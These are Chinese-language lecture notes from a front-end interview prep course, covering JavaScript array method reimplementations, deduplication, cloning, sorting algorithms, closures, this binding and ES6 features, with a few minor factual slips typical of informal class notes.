机理是，数组可以看做是`Array` new出来的，所以数组的`__proto__`都指向`Array.prototype`  。

```js
var arr = [2, 4, 1, 5];

// 封装了一个wangqin方法，功能是求数组和。
Array.prototype.wangqin = function () {
    // 这个函数中的this，是“点儿”wangqin的数组
    let sum = 0;
    for (let i = 0; i < this.length; i++) {
        sum += this[i];
    }
    return sum;
};

let sum = arr.wangqin();
console.log(sum);
```



**作业（有兴趣做，比较难）：**

1、请自己封装一个myfilter方法，实现filter的功能；

2、请自己封装一个mymap方法，实现map的功能；

3、请自己封装一个myreduce方法，实现reduce的功能；





# 面试题辅导第6天 - 笔记 

2022年4月23日 星期六





## 拓展数组功能

任何的数组都可以看做是`Array` new出来的，所以Array.prototype上有的函数，都能够被数组打点访问。



### 面试题：封装自己的filter方法（超级高频面试题）

请自己实现`filter`方法。复习，`filter` 怎么用：

```js
var arr1 = [3, 4, 6, 7, 9];
var arr2 = arr1.filter(item => item % 2 == 0);
console.log(arr2);		// [4, 6]
```

本题是一个超级高频面试题，尤其在北京。



```js
Array.prototype.myfilter = function (fn) {
    // 结果数组
    let results = [];
    // 遍历this（this就是调用myfitler的数组）
    for (let i = 0; i < this.length; i++) {
        if (fn(this[i])) {
            results.push(this[i]);
        }
    }
    return results;
}
```



### 面试题：封装自己的map方法

复习map怎么玩儿：

```js
var arr1 = [3, 4, 6, 7, 9];
var arr2 = arr1.map(item => item * 2);
console.log(arr2);		// [6, 8, 12, 14, 18]
```

自己封装的mymap方法：

```js
Array.prototype.mymap = function (fn) {
    // 结果数组
    let results = [];
    // 遍历this
    for (let i = 0; i < this.length; i++) {
        results.push(fn(this[i]));
    }
    return results;
}

var arr1 = [3, 4, 5, 6, 9];
var arr2 = arr1.mymap(item => item * 2);

console.log(arr2);
```



### 面试题：封装自己的reduce方法

复习一下reduce怎么用：

```js
var arr = [3, 4, 2, 6];
var sum = arr.reduce((a, b) => a + b);
console.log(sum);		// 15
```

之前讲过，这就是“班主任组织大家传纸条”。a就是每个人看到上个提供学给自己的数字，b是自己的数字，返回值就是要交给下个人的数字。、

默认纸条上写的是数组开头那项。

```js
Array.prototype.myreduce = function (fn) {
    let yiyou = this[0];
    for (let i = 1; i < this.length; i++) {
    	yiyou = fn(yiyou, this[i]);
    }
    return yiyou;
};
```



可以添加额外的参数，表示默认值，比如数组去重时：

```js
let result = arr.myreduce((a, b) => a.includes(b) ? a : [...a, b], []);
```



```js
Array.prototype.myreduce = function (fn, defaultValue) {
    let yiyou, startIndex;

    // 判断有没有传入第二个参数
    if (defaultValue == undefined) {
        // 没有传入第二个参数
        yiyou = this[0];
        // 从下标为1开始遍历
        startIndex = 1;
    } else {
        // 传了第二个参数（默认值）
        yiyou = defaultValue;
        // 从下标为0开始遍历
        startIndex = 0;
    }

    for (let i = startIndex; i < this.length; i++) {
        yiyou = fn(yiyou, this[i]);
    }
    return yiyou;
};
```



### 面试题：用三种方法实现数组去重

面试的时候一定要尽力展示自己的知识面，人家没让你用三种方法，你也写三种方法。

**方法1：**reduce法：

```js
var result = arr.reduce((a, b) => a.includes(b) ? a : [...a, b], []);
```

**方法2：**遍历法：

```js
var results = [];
for (let i = 0; i < arr.length; i++) {
	if (!results.includes(arr[i])) {
		results.push(arr[i]);
	}
}
console.log(results);
```

**方法3：**Set法。最最优雅的方法。

`Set` 是ES7中新增的一个数据类型，表示“集合“，说白了，就是**不能有重复项的数组**。

首先我们说，什么是Set：

```js
// Set是内置构造函数，是ES7新增的数据类型，表示“集合”。
// new的时候要传入一个数组进去，集合能够自动去重
let s = new Set([9, 3, 4, 5, 6, 3, 6]);
console.log(s);
```

![image-20220423145511163](F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第6天-案例和笔记》/markdown格式笔记/assets/image-20220423145511163.png)

集合可以通过`[...集合]`变成数组。所以世界上最优美的去重方法：

```js
var results = [...new Set(arr)];
```



### 面试题：拓展数组功能，实现数组去重

```js
Array.prototype.quchong = function () {
    // 利用Set的性质，Set不能有重复项，实现去重
	return [...new Set(this)];
};
var arr1 = [3, 3, 4, 4, 3, 6];
var arr2 = arr1.quchong();
console.log(arr2);
```



## 算法思想：用对象进行哈希计数

### 算法题：请统计数组中每个字母出现的次数

什么叫做“哈希”，是应用“hash”的意思，表示“一一对应”，说白了就是**JS对象**。

做结构化的统计。



题目：请统计数组中每个字母出现的次数。

```js
var arr = ['A', 'B', 'A', 'C', 'A', 'M', 'B', 'A', 'B'];
```

 

答案：

```js
var arr = ['A', 'B', 'A', 'C', 'A', 'M', 'B', 'A', 'B'];

// 结果是一个对象
let o = {};

// 遍历原数组
for (let i = 0; i < arr.length; i++) {
    if (arr[i] in o) {
        o[arr[i]]++;
    } else {
        o[arr[i]] = 1;
    }
}

console.log(o);
```



结果是一个对象，这个对象就是“哈希对象”，就是一个一个的把数量显示出来：

![image-20220423151625424](F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第6天-案例和笔记》/markdown格式笔记/assets/image-20220423151625424.png)



### 面试题：拓展数组功能，求数组中出现次数最多的元素

面试题：请你给数组拓展一个maxTime功能，能够返回数组中出现次数最多的那个元素。比如

```js
let arr = ['A', 'A', 'A', 'C', 'A', 'C', 'C', 'B', 'C', 'B', 'C', 'B', 'C', 'B', 'C', 'B', 'C', 'B', 'B', 'B', 'M', 'X', 'B', 'B'];
let result = arr.maxTime();
console.log(result);		// 'B'
```

注意，本题的思路就是用一个哈希对象进行计数。



```js
Array.prototype.maxTime = function () {
    // 哈希对象
    let o = {};
    // 遍历数组
    for (let i = 0; i < this.length; i++) {
        if (this[i] in o) {
            o[this[i]]++;
        } else {
            o[this[i]] = 1;
        }
    }

    console.log(o);

    // 状元
    let zy_str = '';
    let zy_time = 0;

    // 遍历哈希对象，看谁最大
    for (let k in o) {
        // k是键名，o[k]是值
        if (o[k] > zy_time) {
            zy_time = o[k];
            zy_str = k;
        }
    }

    return zy_str;
}
```



### 面试题：请拓展数组功能，实现groupBy功能

*（本题留作业，明天一上来就讲，明晚19:30上课，因为明天是法定上班日，做完可以发给老师）*

请给数组增加一个groupBy功能，使用方法为：

```js
var arr = [
	{ name: '小A', score: 66 },
	{ name: '小B', score: 76 },
	{ name: '小C', score: 86 },
	{ name: '小D', score: 96 },
	{ name: '小E', score: 46 },
	{ name: '小F', score: 36 },
];
var result = arr.groupBy(item => {
    if (item.score > 85) {
        return '优秀';
    } else if (item.score > 70) {
        return '良好';
    } else if (item.score > 60) {
        return '及格';
    } else {
        return '不及格';
    }
});
console.log(result);	
/* result是这样的对象：
	{
		'优秀': [
            { name: '小C', score: 86 },
            { name: '小D', score: 96 }
		],
		'良好': [
			{ name: '小B', score: 76 }
		],
		'及格': [
			{ name: '小A', score: 66 }
		],
		'不及格': [
			{ name: '小E', score: 46 },
			{ name: '小F', score: 36 }
		]
	}
*/
```



### 面试题：请拓展数组功能，实现groupCount功能

*（明天讲，今晚泡杯茶，慢慢捣鼓）*

请给数组增加一个`groupCount`功能，使用方法为：

```js
var arr = [
	{ name: '小A', score: 66 },
	{ name: '小B', score: 76 },
	{ name: '小C', score: 86 },
	{ name: '小D', score: 96 },
	{ name: '小E', score: 46 },
	{ name: '小F', score: 36 },
];
var result = arr.groupCount(item => {
    if (item.score > 85) {
        return '优秀';
    } else if (item.score > 70) {
        return '良好';
    } else if (item.score > 60) {
        return '及格';
    } else {
        return '不及格';
    }
});
console.log(result);	
/* result是这样的对象：
	{
		'优秀': 2,
		'良好': 1,
		'及格': 1,
		'不及格': 2
	}
*/
```



## 基本类型值和引用类型值

- 基本类型值：number、string、boolean、undefiend、null

- 引用类型值：array、function、object、regexp（正则表达式）、Set、Map……



### 面试题：基本类型值和引用类型值的区别是什么？

答：有两点区别：

**区别①：**在进行`a=b`这样的赋值语句时，基本类型值会在内存中把`b`克隆一份给`a`。引用类型值不可隆，直接将引用给`a`，内存中`a`、`b`指向同一个对象；

```js
var b = 3;
var a = b;

b++;
b++;
b++;
b++;
b++;
console.log(a);     // 3。a不变，因为a、b是内存中的不是数字。
```

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第6天-案例和笔记》/markdown格式笔记/assets/image-20220423155223524.png" alt="image-20220423155223524" style="zoom:33%;" />



```js
var b = [44, 55, 66, 77];
var a = b;

b.push(88);
b.push(99);

console.log(a);     // [44, 55, 66, 77, 88, 99]因为a、b是内存中的同一个数组
```

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第6天-案例和笔记》/markdown格式笔记/assets/image-20220423155523262.png" alt="image-20220423155523262" style="zoom:33%;" />



**区别②：**在进行`a==b`比较时，基本类型值比较值是否相同，引用类型值比较它们是否是内存中的同一个对象。

```js
var a = 3;
var b = 3;
console.log(a == b);		// true
```



```js
var a = [3, 4, 5];
var b = [3, 4, 5];
console.log(a == b);    // false
```

因为a、b指向的是内存中的两个`[3, 4, 5]`数组，而引用类型值在进行`==`比较时，判断依据是它们是否是内存中的同一个对象。



### 面试题：如何判断数组为空？？

不能：

```js
if (arr == []) {

}
```

即使`arr`是空数组，那么也是`false`。因为它们是内存中的不同数组。

```js
console.log([] == []);	// false
```



正确的方法是判断length：

```js
if (arr.length == 0) {

}
```



### 面试题：深克隆和浅克隆（超高频率面试题）

答：比如我们要克隆一个数组，那么语句arr2 = arr1不能实现克隆，arr2和arr1都是内存中的同一个对象。此时就可以使用arr2 = [...arr1]这样的写法实现克隆，它们是内存中的两个对象，彼此分开了。但是，只分开了内部的基本类型值，如果内部有引用类型值，它们还是内存中的同一个引用类型值。所以顾名思义，“浅克隆”。浅克隆，我知道4种方法：点点点法、slice法、Object.assign法、map法。这四种方法都能实现浅克隆。深克隆指的是能让数组、对象完全分开，无论自己内部没有没有其他引用类型值，实现深克隆的方法，就是使用递归。



下面的语句无法实现克隆，是“不克隆”：

```js
let arr1 = [3, 4, 5, 6];
let arr2 = arr1;
```



#### 浅克隆

【方法1：点点点法】

```js
let arr1 = [3, 4, 5, 6];
let arr2 = [...arr1];

console.log(arr2);          // [3, 4, 5, 6]
console.log(arr1 == arr2);  // false。false是好消息，因为表示arr1、arr2不是内存中的同一个数组
```

也能浅克隆对象

```js
let obj1 = {a: 1, b: 2, c: 3};
let obj2 = {...obj1};
console.log(obj1);		// {a: 1, b: 2, c: 3}
console.log(obj1 == obj2);		// false
```



**为什么是“浅”克隆？**

答：因为它只能克隆数组中的基本类型值，而引用类型值，无法实现克隆的。"藕断丝连"。

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第6天-案例和笔记》/markdown格式笔记/assets/image-20220423161309337.png" alt="image-20220423161309337" style="zoom:50%;" />



【方法2：slice法】

```js
var arr1 = [3, 4, 5, 6];
var arr2 = arr1.slice(0);
console.log(arr2);      // [3, 4, 5, 6]
console.log(arr1 == arr2);      // false
```

只能浅克隆数组。



【方法3：Object.assign()法】

`Object.assign` 是合并对象的。它的第一个参数会合并后面的所有参数属性，后面的参数一律不变。

```js
var obj1 = { a: 1, b: 2 };
var obj2 = { c: 3 };
var obj3 = { d: 4 };
var obj4 = { e: 555, f: 66 };

// 合并对象
Object.assign(obj1, obj2, obj3, obj4);

console.log(obj1);      // {a: 1, b: 2, c: 3, d: 4, e: 555, f: 66};
console.log(obj2);      // {c: 3};
console.log(obj3);      // {d: 4};
console.log(obj4);      // {e: 555, f: 66};
```



可以妙用`Object.assign`达到浅克隆的目的：

```js
var obj1 = { a: 3, b: 4 };
var obj2 = Object.assign({}, obj1);		// 将obj1合并到空对象上

console.log(obj1 == obj2);  // false。好消息，说明分开了
console.log(obj2);      // { a: 3, b: 4 }
```



【方法4：map法】

```js
var arr1 = [3, 4, 5, 6];
var arr2 = arr1.map(item => item);
```



#### 深克隆

彻底都分开，不藕断丝连了，解决方法就是“递归”。

```js
function deepClone(o) {
    if (Array.isArray(o)) {
        // 数组
        return o.map(item => deepClone(item));
    } else if (typeof o == 'object') {
        // 对象。
        // 准备一个空对象，然后遍历对象o，把属性都誊抄上去，但是誊抄的值，都要深克隆一下
        let resultobj = {};
        for (let k in o) {
            resultobj[k] = deepClone(o[k]);
        }
        return resultobj;
    } else {
        return o;
    }
}

let arr1 = [3, 4, 5, 6, { m: [7, 8] }];
let arr2 = deepClone(arr1);

console.log(arr2);      // [3, 4, 5, 6, { m: [7, 8] }]
```





# 面试题辅导第7天 - 笔记 

2022年4月24日 星期日



*明晚（周一）19:30，洛洛老师给大家上《面试软技能辅导》，包括简历书写、面试礼仪、常见面试问题等~*



## 封装数组方法（高级）

### 面试题：请封装groupBy方法

请给数组增加一个groupBy功能，使用方法为：

```js
var arr = [
	{ name: '小A', score: 66 },
	{ name: '小B', score: 76 },
	{ name: '小C', score: 86 },
	{ name: '小D', score: 96 },
	{ name: '小E', score: 46 },
	{ name: '小F', score: 36 },
];
var result = arr.groupBy(item => {
    if (item.score > 85) {
        return '优秀';
    } else if (item.score > 70) {
        return '良好';
    } else if (item.score > 60) {
        return '及格';
    } else {
        return '不及格';
    }
});
console.log(result);	
/* result是这样的对象：
	{
		'优秀': [
            { name: '小C', score: 86 },
            { name: '小D', score: 96 }
		],
		'良好': [
			{ name: '小B', score: 76 }
		],
		'及格': [
			{ name: '小A', score: 66 }
		],
		'不及格': [
			{ name: '小E', score: 46 },
			{ name: '小F', score: 36 }
		]
	}
*/
```



程序的运行的顺序，要在脑海中呈现（这里不方便做笔记，可以看视频回放）：

```js
var arr = [
	{ name: '小A', score: 66 },
	{ name: '小B', score: 76 },
	{ name: '小C', score: 86 },
	{ name: '小D', score: 96 },
	{ name: '小E', score: 46 },
	{ name: '小F', score: 36 },
];
// 遍历到这项，带入函数，还没有这个属性呢，创建属性
{
	"及格": [{ name: '小A', score: 66 }],
	"良好": [{ name: '小B', score: 76 }],
	"优秀": [{ name: '小C', score: 86 }, { name: '小D', score: 96 }],
	"不及格": [{ name: '小E', score: 46 }, { name: '小F', score: 36 }]
}
```



最后的答案：

```js
Array.prototype.groupBy = function (fn) {
    let o = {};
    // 遍历数组
    for (let i = 0; i < this.length; i++) {
        // 带入函数执行一下，得到键名
        let k = fn(this[i]);
        // 看哈希对象中，是否已经有了这个键名
        if (k in o) {
            o[k].push(this[i]);
        } else {
            // 没有这个键名，就给a补一个这个键名
            // 值就是数组中放着它自己
            o[k] = [this[i]];
        }
    }

    return o;
};
```

不要丧失信心，把这题攻破！





### 面试题：请封装groupCount方法

请给数组增加一个`groupCount`功能，使用方法为：

```js
var arr = [
	{ name: '小A', score: 66 },
	{ name: '小B', score: 76 },
	{ name: '小C', score: 86 },
	{ name: '小D', score: 96 },
	{ name: '小E', score: 46 },
	{ name: '小F', score: 36 },
];
var result = arr.groupCount(item => {
    if (item.score > 85) {
        return '优秀';
    } else if (item.score > 70) {
        return '良好';
    } else if (item.score > 60) {
        return '及格';
    } else {
        return '不及格';
    }
});
console.log(result);	
/* result是这样的对象：
	{
		'优秀': 2,
		'良好': 1,
		'及格': 1,
		'不及格': 2
	}
*/
```



正确答案：

```js
Array.prototype.groupCount = function (fn) {
    let o = {};
    // 遍历数组
    for (let i = 0; i < this.length; i++) {
        // 带入函数执行一下，得到键名
        let k = fn(this[i]);
        // 看哈希对象中，是否已经有了这个键名
        if (k in o) {
            o[k]++;
        } else {
            // 没有这个键名，就给a补一个这个键名
            // 值就是数组中放着它自己
            o[k] = 1;
        }
    }

    return o;
};
```



### 面试题：请封装without方法

请编程实现：为数组拓展without功能，将返回一个删除所有参数值后的新数组，参数可以有任意个。比如：

```js
let arr1 = [4, 5, 5, 7, 3, 2];
let arr2 = arr1.without(5, 2);
console.log(arr2);  // [4, 7, 3]
```

再比如：

```js
let arr3 = [1, 2, 3, 4, 5, 6, 7];
let arr4 = arr3.without(3, 4, 5, 6, 7);
console.log(arr4);  // [1, 2]
```



#### **先解决一个大事儿：参数如果有任意多个怎么办？？**

##### **【方法1】点点点法**

ES6中有一个“剩余参数”这么一个事儿，比如下例：

```js
function fun(a, b, ...c) {
    // 注意，点点点和“解构”没有半毛钱关系，是一个全新的功能，表示“剩余参数”
    console.log(a);
    console.log(b);
    console.log(c);  // 数组[5, 6, 7]，就是所有剩下的参数
}
fun(3, 4, 5, 6, 7);
```

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第7天-案例和笔记》\markdown格式笔记\assets\image-20220424195708652.png" alt="image-20220424195708652" style="zoom:50%;" />



##### **【方法2】arguments**法

函数内部，可以使用一个关键词`arguments`，表示函数收到的**所有实参**。

```js
function fun() {
    // 函数内部使用arguments表示收到的所有参数
    console.log(arguments);
    // arguments不是数组。类数组对象。
    console.log(Array.isArray(arguments));   // false，不是数组，是类数组对象
}
fun(3, 4, 5, 6, 7, 8, 9);
```

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第7天-案例和笔记》\markdown格式笔记\assets\image-20220424200102025.png" alt="image-20220424200102025" style="zoom:50%;" />

arguments是一个**”类数组对象“**，本质上是一个对象，k-v对儿的集合，只不过它的所有k都是数字而已。

*补充知识：如何将类数组对象变为数组？*

① 使用`Array.from() `可以将类数组对象变为数组；

② 使用`[...类数组对象]`  可以将类数组对象变为数组；



将类数组对象变为数组，非常有必要，为啥呢？？比如：

```js
arguments.includes(6);		// 报错！因为arguments是对象，不能打点调用includes
Array.from(arguments).includes(6);	// 成功，因为Array.from()就是数组了。
[...arguments].includes(6);	 // 成功，因为[...类数组对象] 就是数组了。
```



#### 开始封装without方法

答案1：

```js
Array.prototype.without = function (...a) {
    return this.filter(item => !a.includes(item));
};
```



答案2：

```js
Array.prototype.without = function () {
    return this.filter(item => !Array.from(arguments).includes(item));
};
```





## 数组排序

我们一直没有讲解数组排序，但是我们在二手车的表格中，用了排序，为啥？

因为：工作中，都是服务端在排序。我们当时，只是把排序的命令发给了服务器，`?sortby=buydate&sortdirection=-1`，按购买日期逆序。



### 面试题：内置sort排序怎么使用？

JS内置的`sort`方法，接受一个函数当做参数。这个参数和reduce一样，有a、b两个形参。

- a表示排在前面的数字

- b表示排在后面的数字

*如果需要这两个数字改变位置，就返回任意一个整数；否则就返回任意一个负数。*

```js
var arr1 = [6, 7, 8, 4, 3, 10, 3, 8];
arr1.sort((a, b) => {
    // 如果排在前面的大于排在后面的，不改变位置。说明我们希望倒序，大→小。
    if (a > b) {
        return -678345;
    } else {
        return 2343546567;
    }
});
console.log(arr1);
```

可以简化为：

```js
var arr1 = [6, 7, 8, 4, 3, 10, 3, 8];
arr1.sort((a, b) => a - b);
console.log(arr1);
```

![image-20220424202828173](F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第7天-案例和笔记》\markdown格式笔记\assets\image-20220424202828173.png)



再比如：

```js
// 按分数排序
var arr2 = [
    {
        name: '小A', score: 45
    },
    {
        name: '小B', score: 75
    },
    {
        name: '小C', score: 95
    },
    {
        name: '小D', score: 25
    }
];
arr2.sort((a, b) => b.score - a.score);
console.log(arr2);


// 按价格排序
var arr3 = [
    {name: '产品1', price: 10, count: 6},
    {name: '产品2', price: 5, count: 88},
    {name: '产品3', price: 1, count: 7},
    {name: '产品4', price: 4, count: 3},
];
arr3.sort((a, b) => b.price * b.count - a.price * a.count);
console.log(arr3);
```

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第7天-案例和笔记》\markdown格式笔记\assets\image-20220424202837201.png" alt="image-20220424202837201" style="zoom:50%;" />





### 面试题：冒泡排序

不用内置的`sort`，我们自己用for循环怼出来。因为面试考。考察你用三种方法排序。

5个数字，要排序4趟：第0趟、第1趟、第2趟、第3趟

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第7天-案例和笔记》\markdown格式笔记\assets\image-20220424203630763.png" alt="image-20220424203630763" style="zoom: 33%;" />

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第7天-案例和笔记》\markdown格式笔记\assets\image-20220424203637990.png" alt="image-20220424203637990" style="zoom:33%;" />

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第7天-案例和笔记》\markdown格式笔记\assets\image-20220424203643121.png" alt="image-20220424203643121" style="zoom:33%;" />

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第7天-案例和笔记》\markdown格式笔记\assets\image-20220424203648520.png" alt="image-20220424203648520" style="zoom:33%;" />



![image-20220424204555446](F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第7天-案例和笔记》\markdown格式笔记\assets\image-20220424204555446.png)



完整代码：

```js
let arr = [45, 634, 52, 34, 3456, 45, 6, 324, 3, 465, 23, 4, 456];

for (let i = 0; i <= arr.length - 2; i++) {
    for (let j = arr.length - 1; j >= i + 1; j--) {
        if (arr[j] < arr[j - 1]) {
            // 交换两个变量的值，要借助第三个变量。
            let temp = arr[j];
            arr[j] = arr[j - 1];
            arr[j - 1] = temp;
        }
    }
}

console.log(arr);
```



记住，是for套for套if的形式。

	- 外层for，`0` → `arr.length-2`
	- 内存for，`arr.length - 1` → `i + 1`
	- 最内层if： 判断`arr[j] `和 `arr[j-1]`大小，交换两个元素位置



### 面试题：快速排序

采用二分法思想：一个数组中，用下标为0的当做标杆，比标杆小的放一起，比标杆大的放一起。

比标杆小的这一堆儿，继续用下标为0的当做标杆，比标杆小的放一起，比标杆大的放一起……

比标杆大的这一堆儿，继续用下标为0的当做标杆，比标杆小的放一起，比标杆大的放一起……

……

……

如此进行，就有顺序了。

```js
function quickSort(arr) {
    // 防止死循环。如果来排序的数组是1项或者是空数组，就返回它本身即可。
    if (arr.length <= 1) return arr;

    // 标杆，用数组下标为0的当做标杆
    var pivot = arr[0];

    let small = [];
    let big = [];

    // 从下标为1的开始遍历。比标杆小，扔small里，比标杆大，扔big里。
    for (let i = 1; i < arr.length; i++) {
        if (arr[i] > pivot) {
            big.push(arr[i]);
        } else {
            small.push(arr[i]);
        }
    }

    return [...quickSort(small), pivot, ...quickSort(big)];
}


var result = quickSort([8, 3, 5, 4, 9, 12, 1, 2, 2, 9, 9, 4, 15, 43, 11]);
console.log(result);
```



##  类型

###  typeof 检测结果

```js
typeof 3;  			// 'number'
typeof 'aa';  		// 'string'
typeof true;  		// 'boolean'
typeof null;  		// 'object'  → 面试常考
typeof undefined;  	// 'undefined'  → 面试常考，undefined是自己的类型

typeof [1,2];  		// 'object' → 面试常考，数组用typeof检测结果是对象
typeof {a: 1};  	// 'object'
typeof ()=>{};  	// 'function'
typeof /^\d$/;  	// 'object'
typeof Math;		// 'object'
typeof new Set();  			// 'object'，ES7的新数据类型
typeof new Map();  			// 'object'，ES7的新数据类型
```



### 面试题：如何检测数组类型？（高频面试题）

数组不能用`typeof`来检测，因为`typeof`结果是`object`。

【方法1】用`Array.isArray()`来检测，true就是数组，false就不是数组。兼容到IE9，属于ES6新增的方法。

【方法2】“鸭式辨型”。如果一个东西是黄色的、走路一摇一摆、嘎嘎叫、能游泳、烤着吃还很香，它就是鸭子。（哲学意义：从一个东西的能力上，来判断它属于一个物种）。



```js
// 鸭式辨型，判断一个东西是数组。这个东西能push、有length、有一个特殊的奇淫巧技，就是反过来调用toString，结果是'[object Array]'

console.log(Object.prototype.toString.call(o) == '[object Array]' && 'push' in o && 'length' in o);
```



下图给你解释一下，为什么用`Object.prototype.toString`去call，因为`toString`本身就是定义在`Object.prototype`。

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第7天-案例和笔记》\markdown格式笔记\assets\image-20220424213025024.png" alt="image-20220424213025024" style="zoom: 33%;" />



## 作用域和闭包（大俗题）

### 作用域

*小心变量声明提升！*

```js
var a = 1;
function fun() {
    console.log(a);
    var a = 2;  // 注意，这个var a会提升，会提升到函数内部所有语句之前，这样就会把外部的a遮蔽掉。
}
fun();
```

答案是：undefined。



一定一定要注意变量生命提升， 因为是js的一个独有的特性。

```js
var a = 1;
function fun() {
    a++;
    a++;
    a++;
    var a = 2;
}
fun();
console.log(a);     // 1
```



提升：

```js
console.log(a);
var a = 30;
```



**暂时性死区（TDZ）：**let和const没有变量声明提升。不但没有，而且你在声明前使用变量，会报错。

```js
var a = 444;
function fun() {
    console.log(a);
    let a = 45;
}
fun();
```

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第7天-案例和笔记》\markdown格式笔记\assets\image-20220424214330115.png" alt="image-20220424214330115" style="zoom:50%;" />



### 大俗面试题：闭包

**面试官：什么是闭包？**

**你答：**比如一个函数里面return了另一个函数，被变量inn接收，调用inn，你会发现函数能够访问当初定义时候的作用域。函数的作用域链，不随它的调用位置改变而改变。换句话说，*函数能够记忆住当年定义时候的作用域*。仿佛对内部函数有一个看不见的“包裹”，包裹里面装着它的作用域，叫做“闭包”。



```js
function outer() {
    var a = 3;
    return function () {
        alert(a)
    }
}

var a = 5;
var inn = outer();
inn();
```



**闭包的用途：**

1、记忆性，能够产生相关的函数；

2、私有性，保护变量，产生可预测的结果。



**闭包的问题，内存泄漏：**

闭包容易产生内存泄漏。比如我们让内部函数 `inn = null` 内部函数被垃圾回收了，但是它的闭包中的a值还在内存中，内存中永远卸载不掉这个a，称为“内存泄漏”。“内存泄漏”就是变量长期贮存在内存中了。





▲ 利用记忆性，制作“偏函数”：

```js
// 偏函数是对原始函数的二次封装,是将现有函数的部分参数预先绑定为指定值,从而得到一个新的函数,该函数就称为偏函数。
function fun(biaozhunwendu) {
    return function (n) {
        if (n > biaozhunwendu) {
            alert('发烧');
        } else {
            alert('正常')
        }
    }
}

let city1Check = fun(37.2);
let city2Check = fun(37.0);

city1Check(37.1);       // 正常
city1Check(37.8);       // 发烧
city2Check(37.1);       // 发烧
city2Check(37.8);       // 发烧
```



▲ 利用私有性，保护变量，让变量以可预测的操作进行：

```js
function fun() {
    var a = 10;
    return {
        add() {
            a++;
        },
        double() {
            a *= 2;
        },
        getA() {
            return a;
        }
    }
}

let api = fun();
console.log(api.getA());     // 10
api.add();
api.add();
api.add();
api.add();
api.add();
console.log(api.getA());    // 15
api.double();
api.double();
console.log(api.getA());     // 60
```



## 上下文、面向对象、原型链

### 面试题：如何判断函数的上下文this？

普通函数 `function(){}` 的`this`是谁？*要看如何调用，而不是如何定义。*

**7个规则：**

- `fun()`，上下文是window

- `obj.fun()`，上下文是obj

- `arr[3].fun()`，上下文是arr

- `btn.onclick = fun`，上下文是btn

- `fun.call(obj)`、`fun.apply(obj)`，上下文是obj
- `new fun()`，上下文是秘密创建的空白对象
- `setTimeout(fun, 2000)`，上下文是window



捡回记忆：

```js
var obj = {
	a: 3,
	fun() {
		console.log(this.a);
	}
};
var f = obj.fun;
var a = 5;
f();		// 规则1，上下文是window，输出5

obj.fun();	// 规则2，上下文是obj，输出3
```

（周一、周二可以把当年的考试题、作业题都看看，去学习系统中看），当然这几天也有新题，系统中有《前端常见面试题模拟试卷1》、《前端常见面试题模拟试卷2》、《前端常见面试题模拟试卷3》……



**箭头函数的 `this` 是由定义时候的作用域决定的，而不是如何调用，海枯石烂。**

```js
function fun() {
	return () => {
		alert(this.a);
	};
}
var obj1 = { a: 3 };
var obj2 = { a: 5 };

// 箭头函数诞生的时候，箭头函数所处的环境上下文是obj1，所以箭头函数就用obj。当做上下文，海枯石烂。
var jths = fun.call(obj1);
jths();					// 3
jths.call(obj2);		// 3
```



### 面试题：call、apply和bind的区别

call、apply、bind都能够指定上下文。

call所有的参数都罗列出来：

`函数.call(对象, 参数, 参数, 参数, 参数, 参数)`

apply所有的参数放到数组中：

`函数.apply(对象, [参数, 参数, 参数, 参数, 参数])`



`bind`不执行函数，终身改变一个函数的上下文。ES6新增的函数，从IE9开始兼容。



```js
function fun() {
	console.log(this.a);
}

var obj1 = { a: 3 };
var obj2 = { a: 5 };

// bind不执行函数，而是返回一个新函数。这个新函数，绑死了上下文
fun = fun.bind(obj1);

// 一旦bind，终身绑死上下文，不管如何调用，上下文都是obj1
fun();             // 3
fun.call(obj2);    // 3
```





预习：

面试题：new的时候到底发生了什么？
面试题：请简述原型链查找
面试题：如何实现继承？
面试题：ES6中如何写类？类的本质是什么？

有关Promise
面试题：Promise解决了什么问题？它如何运作？
面试题：Promise的实例有哪些方法？
面试题：Promise如何检测错误？



# 面试题辅导第8天 - 笔记 

2022年4月27日 星期三



*重要提示：Node.js课一定要来直播课哦，我们会讲解基于Node.js的工作流工具，比如webpack、gulp，这块儿也有挺多面试题的。比如经典面试题：如何优化网页显示速度？实际上就是webpack性能调优。*

并且，大家带回来的面试题，实时会给大家看。Node.js一定要来，不是盲目拔高。



## ES Next

### 面试题：ES6中有哪些新增内容？

> 这个面试题有一个非常大的“约定俗成”，就是面试官嘴里的“ES6”实际上表示“ES6、7、8、9”就是所有的高级JS新特性，不是真的只有ES6哦。所以我们上课的时候，根本没有细分哪些特性是ES6的，哪些是ES7的，哪些是ES8的。

新特性有：let 和 const命令、箭头函数、Promise、async/await、数组的filter/map/reduce方法、解构、点点点运算符、k-v一致省略v、方法可以不写function、剩余参数、Set和Map数据结构、class类表示法、字符串的padStart方法。



**let 和 const命令**

```js
{
	let a = 10;
}
console.log(a);	// 报错

const b = 10;
b++;	// 报错
```



**箭头函数**

```js
const sum = (a, b) => a + b;

const size = r => 3.14 * r * r;

const getObject = (name, age) => ({ name: name, age: age });
```



**Promise、async/await**

```js
let p = new Promise((resolve, reject) => {
	// 异步
});

async function main() {
	await p.then();
}
```



**数组map、reduce、filter方法**

```
let arr1 = [3, 4, 5, 6];
console.log(arr1.map(item => item * 2));
console.log(arr1.filter(item => item % 2 == 2));
console.log(arr1.reduce((a, b) => a + b));
```



**解构、点点点运算符**

```js
// 解构
const [a, b, c] = [3, 4, 5];
